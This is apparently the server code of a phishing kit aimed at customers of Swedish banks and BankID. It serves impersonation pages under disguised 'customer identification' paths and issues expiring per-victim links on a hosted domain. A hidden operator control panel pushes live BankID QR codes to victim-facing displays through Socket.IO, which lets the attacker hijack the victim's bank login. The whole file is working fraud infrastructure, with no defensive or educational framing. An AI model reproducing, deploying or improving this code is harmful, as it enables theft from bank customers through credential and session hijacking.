const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: {
        origin: "*",
        methods: ["GET", "POST", "OPTIONS"],
        credentials: true
    },
    transports: ['websocket', 'polling'],
    path: '/socket.io'
});
const path = require('path');
const crypto = require('crypto');
const config = require('./config');

// Session storage for temporary URLs
const temporaryUrls = new Map();

// Function to generate secure random string
function generateSecureToken(length = 32) {
    return crypto.randomBytes(length).toString('hex');
}

// Function to create temporary URL
function createTemporaryUrl(bankId, expirationMinutes = 720) {
    const token = generateSecureToken();
    const expiration = Date.now() + (expirationMinutes * 60 * 1000);
    
    temporaryUrls.set(token, {
        bankId,
        expiration,
        qrData: null
    });
    
    return token;
}

// Middleware to clean expired URLs
function cleanExpiredUrls() {
    const now = Date.now();
    for (const [token, data] of temporaryUrls.entries()) {
        if (data.expiration < now) {
            temporaryUrls.delete(token);
        }
    }
}

// Run cleanup every 5 minutes
setInterval(cleanExpiredUrls, 5 * 60 * 1000);

// Enable JSON body parsing
app.use(express.json({ limit: '2mb' }));

// Add CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Origin, X-Requested-With');
    res.header('Access-Control-Allow-Credentials', 'true');
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Track connected displays
const connectedDisplays = new Set();

// Routes for all display pages (with and without .html)
for (let i = 1; i <= 7; i++) {
    app.get([`/display${i}`, `/display${i}.html`], (req, res) => {
        res.sendFile(path.join(__dirname, 'public', `display${i}.html`));
    });
}

// Bank page mapping
const bankPages = {
    'nordea': 'Nordeafelsokningskundidentifieringkund98721311',
    'swedbank': 'Swedfelsokningskundidentifieringkund98721311',
    'handelsbanken': 'Handelsfelsokningskundidentifieringkund98721311',
    'skandia': 'Skandiafelsokningskundidentifieringkund98721311',
    'seb': 'Sebfelsokningskundidentifieringkund98721311',
    'lansforsakringar': 'Lansforsakringarfelsokningskundidentifieringkund98721311',
    'danskebank': 'Danskebankfelsokningskundidentifieringkund98721311',
    'bankid': 'Bankidfelsokningskundidentifieringkund98721311',
    'drag': 'Dragfelsokningskundidentifieringkund98721311'
};

// Bank display names for URLs
const bankDisplayNames = {
    'nordea': 'Nordea',
    'swedbank': 'Swedbank',
    'handelsbanken': 'Handelsbanken',
    'skandia': 'Skandia',
    'seb': 'SEB',
    'lansforsakringar': 'Lansforsakringar',
    'danskebank': 'Danske Bank',
    'bankid': 'BankID',
    'drag': 'Drag'
};

// Bank routes with and without .html
Object.entries(bankPages).forEach(([bankId, page]) => {
    app.get([`/${page}`, `/${page}.html`], (req, res) => {
        res.sendFile(path.join(__dirname, 'public', `${page}.html`));
    });
});

// API to generate temporary URL
app.post('/api/generate-temp-url', (req, res) => {
    const { bankId, expirationMinutes } = req.body;
    
    if (!bankId || !bankPages[bankId.toLowerCase()]) {
        return res.status(400).json({ error: 'Invalid bank ID' });
    }
    
    const token = createTemporaryUrl(bankId.toLowerCase(), expirationMinutes || 720);
    const bankName = bankDisplayNames[bankId.toLowerCase()].replace(/\s+/g, '');
    const tempUrl = `https://web-production-c116.up.railway.app/${bankName}/${token}`;
    
    res.json({
        url: tempUrl,
        expiresIn: expirationMinutes || 720,
        token
    });
});

// Add endpoint to expire URL manually
app.post('/api/expire-url', (req, res) => {
    const { token } = req.body;
    
    if (!token || !temporaryUrls.has(token)) {
        return res.status(404).json({ error: 'URL not found' });
    }
    
    temporaryUrls.delete(token);
    res.json({ message: 'URL expired successfully' });
});

// Handle temporary URLs for each bank
Object.entries(bankDisplayNames).forEach(([bankId, bankName]) => {
    const urlSafeName = bankName.replace(/\s+/g, '');
    app.get(`/${urlSafeName}/:token`, (req, res) => {
        const { token } = req.params;
        const session = temporaryUrls.get(token);
        
        if (!session || session.expiration < Date.now()) {
            temporaryUrls.delete(token);
            return res.status(404).send('This link has expired or is invalid');
        }
        
        if (session.bankId !== bankId) {
            return res.status(404).send('Invalid bank URL');
        }
        
        const bankPage = bankPages[bankId];
        res.sendFile(path.join(__dirname, 'public', `${bankPage}.html`));
    });

    // Add route for BankID with capital letters
    if (bankId === 'bankid') {
        app.get('/BankID/:token', (req, res) => {
            const { token } = req.params;
            const session = temporaryUrls.get(token);
            
            if (!session || session.expiration < Date.now()) {
                temporaryUrls.delete(token);
                return res.status(404).send('This link has expired or is invalid');
            }
            
            if (session.bankId !== bankId) {
                return res.status(404).send('Invalid bank URL');
            }
            
            const bankPage = bankPages[bankId];
            res.sendFile(path.join(__dirname, 'public', `${bankPage}.html`));
        });
    }
});

// Existing bank routes (keeping for backward compatibility)
app.get('/Nordeafelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Nordeafelsokningskundidentifieringkund98721311.html'));
});

app.get('/Swedfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Swedfelsokningskundidentifieringkund98721311.html'));
});

app.get('/Handelsfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Handelsfelsokningskundidentifieringkund98721311.html'));
});

app.get('/Skandiafelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Skandiafelsokningskundidentifieringkund98721311.html'));
});

app.get('/Sebfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Sebfelsokningskundidentifieringkund98721311.html'));
});

app.get('/Lansforsakringarfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Lansforsakringarfelsokningskundidentifieringkund98721311.html'));
});

app.get('/Danskebankfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Danskebankfelsokningskundidentifieringkund98721311.html'));
});

// Add route for Drag
app.get('/Dragfelsokningskundidentifieringkund98721311', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Dragfelsokningskundidentifieringkund98721311.html'));
});

// Add a root route
app.get('/', (req, res) => {
    res.redirect('/dashboard_98721311_control_panel.html');
});

// Handle dashboard route with and without .html
app.get(['/dashboard_98721311_control_panel', '/dashboard_98721311_control_panel.html'], (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard_98721311_control_panel.html'));
});

// Add a health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy',
        displays: Array.from(connectedDisplays),
        activeTemporaryUrls: Array.from(temporaryUrls.keys()).length
    });
});

// Add API routes
app.get('/api/qr', (req, res) => {
    res.status(200).json({ message: 'QR code endpoint is ready' });
});

app.post('/api/qr', (req, res) => {
    console.log('Received QR code request from:', req.get('origin'));
    const qrData = req.body.qrData;
    const sessionToken = req.body.sessionToken;

    if (!qrData) {
        console.error('No QR data provided in request');
        return res.status(400).json({ error: 'No QR code data provided' });
    }

    try {
        // Validate base64 image data
        if (!qrData.startsWith('data:image/')) {
            console.error('Invalid image data format');
            throw new Error('Invalid image data');
        }

        // If session token is provided, store QR for that session
        if (sessionToken && temporaryUrls.has(sessionToken)) {
            console.log('Storing QR for session:', sessionToken);
            temporaryUrls.get(sessionToken).qrData = qrData;
        }

        // Broadcast to all connected clients
        console.log('Broadcasting QR to', connectedDisplays.size, 'displays');
        io.emit('new_qr', qrData);
        
        // Log success (helpful for debugging)
        console.log('QR code broadcast successful');
        
        res.status(200).json({ 
            message: 'QR code broadcast successful',
            activeDisplays: Array.from(connectedDisplays)
        });
    } catch (error) {
        console.error('Error processing QR code:', error);
        res.status(400).json({ error: 'Invalid QR code data' });
    }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    socket.on('register_display', (displayId) => {
        console.log(`Display ${displayId} registered`);
        connectedDisplays.add(displayId);
        io.emit('displays_updated', Array.from(connectedDisplays));
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        // Remove display from tracking
        connectedDisplays.forEach(displayId => {
            if (socket.displayId === displayId) {
                connectedDisplays.delete(displayId);
                io.emit('displays_updated', Array.from(connectedDisplays));
            }
        });
    });
});

// Add error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

// Add 404 handling middleware
app.use((req, res, next) => {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Export the app and http server
module.exports = http;

// Start the server if not being run by Vercel
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    http.listen(PORT, () => {
        console.log(`Server is running on port ${PORT}`);
    });
} 